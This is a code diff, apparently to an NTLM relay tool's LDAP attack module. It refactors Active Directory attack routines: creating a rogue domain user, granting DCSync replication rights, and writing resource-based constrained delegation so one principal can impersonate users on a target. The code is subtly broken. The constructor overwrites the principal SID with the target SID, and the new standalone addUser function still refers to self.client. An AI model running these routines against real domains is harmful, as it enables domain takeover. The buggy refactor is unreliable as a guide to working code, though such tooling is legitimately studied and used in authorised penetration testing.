@@ -115,8 +115,15 @@ class LDAPAttack(ProtocolAttack):
     GENERIC_EXECUTE         = 0x00020004
     GENERIC_ALL             = 0x000F01FF
 
-    def __init__(self, config, LDAPClient, username, args):
-        self.args = args
+    def __init__(self, config, LDAPClient, username, root_dn, args=None):
+        if args:
+            self.principalidentity_dn = args.principalidentity_dn
+            self.principalidentity_sid = args.principalidentity_sid
+            self.targetidentity_dn = args.targetidentity_dn
+            self.principalidentity_sid = args.targetidentity_sid
+            self.args = args
+
+        self.rootDN = root_dn
         self.computerName = '' if not config.addcomputer else config.addcomputer[0]
         self.computerPassword = '' if not config.addcomputer or len(config.addcomputer) < 2 else config.addcomputer[1]
         ProtocolAttack.__init__(self, config, LDAPClient, username)
@@ -190,56 +197,6 @@ class LDAPAttack(ProtocolAttack):
             alreadyAddedComputer = True
             # Return the SAM name
             return newComputer
-
-    def addUser(self, parent, domainDumper):
-        """
-        Add a new user. Parent is preferably CN=Users,DC=Domain,DC=local, but can
-        also be an OU or other container where we have write privileges
-        """
-        global alreadyEscalated
-        if alreadyEscalated:
-            LOG.error('New user already added. Refusing to add another')
-            return
-
-        if not self.client.tls_started and not self.client.server.ssl:
-            LOG.info('Adding a user account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
-            if not self.client.start_tls():
-                LOG.error('StartTLS failed')
-                return False
-
-        # Random password
-        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
-
-        # Random username
-        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
-        newUserDn = 'CN=%s,%s' % (newUser, parent)
-        ucd = {
-            'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % domainDumper.root,
-            'distinguishedName': newUserDn,
-            'cn': newUser,
-            'sn': newUser,
-            'givenName': newUser,
-            'displayName': newUser,
-            'name': newUser,
-            'userAccountControl': 512,
-            'accountExpires': '0',
-            'sAMAccountName': newUser,
-            'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
-        }
-        LOG.info('Attempting to create user in: %s', parent)
-        res = self.client.add(newUserDn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
-        if not res:
-            # Adding users requires LDAPS
-            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
-                LOG.error('Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
-            else:
-                LOG.error('Failed to add a new user: %s' % str(self.client.result))
-            return False
-        else:
-            LOG.info('Adding new user with username: %s and password: %s result: OK' % (newUser, newPassword))
-
-            # Return the DN
-            return newUserDn
 
     def addUserToGroup(self, userDn, domainDumper, groupDn):
         global alreadyEscalated
@@ -341,34 +298,9 @@ class LDAPAttack(ProtocolAttack):
             LOG.info('Attribute msDS-KeyCredentialLink does not exist')
         return
 
-    def delegateAttack(self, usersam, targetsam, domainDumper, sid):
-        global delegatePerformed
-        if targetsam in delegatePerformed:
-            LOG.info('Delegate attack already performed for this computer, skipping')
-            return
-
-        if not usersam:
-            usersam = self.addComputer('CN=Computers,%s' % domainDumper.root, domainDumper)
-            self.config.escalateuser = usersam
-
-        if not sid:
-            # Get escalate user sid
-            result = self.getUserInfo(domainDumper, usersam)
-            if not result:
-                LOG.error('User to escalate does not exist!')
-                return
-            escalate_sid = str(result[1])
-        else:
-            escalate_sid = usersam
-
-        # Get target computer DN
-        result = self.getUserInfo(domainDumper, targetsam)
-        if not result:
-            LOG.error('Computer to modify does not exist! (wrong domain?)')
-            return
-        target_dn = result[0]
-
-        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+    def delegateAttack(self):
+        self.client.search(self.targetidentity_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
+        target_entries = self.client.entries
         targetuser = None
         for entry in self.client.response:
             if entry['type'] != 'searchResEntry':
@@ -385,12 +317,12 @@ class LDAPAttack(ProtocolAttack):
         except IndexError:
             # Create DACL manually
             sd = create_empty_sd()
-        sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
+        sd['Dacl'].aces.append(create_allow_ace(self.principalidentity_sid))
         self.client.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
         if self.client.result['result'] == 0:
             LOG.info('Delegation rights modified succesfully!')
-            LOG.info('%s can now impersonate users on %s via S4U2Proxy', usersam, targetsam)
-            delegatePerformed.append(targetsam)
+            LOG.info('%s can now impersonate users on %s via S4U2Proxy', self.principalidentity_dn, target_entries[0]['sAMAccountName'].values[0])
+            return True
         else:
             if self.client.result['result'] == 50:
                 LOG.error('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
@@ -398,7 +330,7 @@ class LDAPAttack(ProtocolAttack):
                 LOG.error('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
             else:
                 LOG.error('The server returned an error: %s', self.client.result['message'])
-        return
+            return False
 
     def dacl_remove_ace(self,secdesc, guid, usersid, accesstype):
         to_remove = None
@@ -429,7 +361,7 @@ class LDAPAttack(ProtocolAttack):
             # Not found
             return False
 
-    def aclAttack(self, userDn, domainDumper):
+    def aclAttack(self):
         rights = {
                 'dcsync':['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'],
                 'all':['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2','00299570-246d-11d0-a768-00aa006e0529','bf9679c0-0de6-11d0-a285-00aa003049e2'],
@@ -439,10 +371,10 @@ class LDAPAttack(ProtocolAttack):
 
         # Query for the sid of our user
         try:
-            self.client.search(userDn, '(objectClass=user)', attributes=['sAMAccountName', 'objectSid'])
+            self.client.search(self.principalidentity_dn, '(objectClass=user)', attributes=['sAMAccountName', 'objectSid'])
             entry = self.client.entries[0]
         except IndexError:
-            LOG.error('Could not retrieve infos for user: %s' % userDn)
+            LOG.error('Could not retrieve infos for user: %s' % self.principalidentity_dn)
             return
         username = entry['sAMAccountName'].value
         usersid = entry['objectSid'].value
@@ -453,7 +385,7 @@ class LDAPAttack(ProtocolAttack):
         alreadyEscalated = True
 
         LOG.info('Querying domain security descriptor')
-        self.client.search(domainDumper.root, f'(&(objectClass=*)(distinguishedName={self.args.targetidentity}))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
+        self.client.search(self.rootDN, f'(&(objectClass=*)(distinguishedName={self.targetidentity_dn}))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
 
         if len(self.client.entries) == 0:
             LOG.error(f'{self.args.targetidentity} not found in domain. Ensure to use valid object distinguishedName property')
@@ -503,7 +435,7 @@ class LDAPAttack(ProtocolAttack):
 
 
             # Query the SD again to see what AD made of it
-            self.client.search(domainDumper.root, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
+            self.client.search(self.rootDN, '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
             entry = self.client.entries[0]
             newSD = entry['nTSecurityDescriptor'].raw_values[0]
             return True
@@ -1089,6 +1021,55 @@ def can_add_member(ace):
         return writeprivs
     userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf9679c0-0de6-11d0-a285-00aa003049e2'
     return writeprivs and userprivs
+
+def addUser(parent, client, root_dn, newUser=None, newPassword=None):
+    """
+    Add a new user. Parent is preferably CN=Users,DC=Domain,DC=local, but can
+    also be an OU or other container where we have write privileges
+    """
+    if not client.tls_started and not client.server.ssl:
+        LOG.info('Adding a user account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
+        if not self.client.start_tls():
+            LOG.error('StartTLS failed')
+            return False
+
+    # Random password
+    if not newPassword:
+        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
+
+    # Random username
+    if not newUser:
+        newUser = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+
+    newUserDn = 'CN=%s,%s' % (newUser, parent)
+    ucd = {
+        'objectCategory': 'CN=Person,CN=Schema,CN=Configuration,%s' % root_dn,
+        'distinguishedName': newUserDn,
+        'cn': newUser,
+        'sn': newUser,
+        'givenName': newUser,
+        'displayName': newUser,
+        'name': newUser,
+        'userAccountControl': 512,
+        'accountExpires': '0',
+        'sAMAccountName': newUser,
+        'unicodePwd': '"{}"'.format(newPassword).encode('utf-16-le')
+    }
+    LOG.info('Attempting to create user in: %s', parent)
+    res = client.add(newUserDn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
+    if not res:
+        # Adding users requires LDAPS
+        if client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
+            LOG.error('Failed to add a new user. The server denied the operation. Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
+        else:
+            LOG.error('Failed to add a new user: %s' % str(self.client.result))
+        return False
+    else:
+        LOG.info('Adding new user with username: %s and password: %s result: OK' % (newUser, newPassword))
+
+        # Return the DN
+        return newUserDn
+
 
 # Universal SIDs
 WELL_KNOWN_SIDS = {
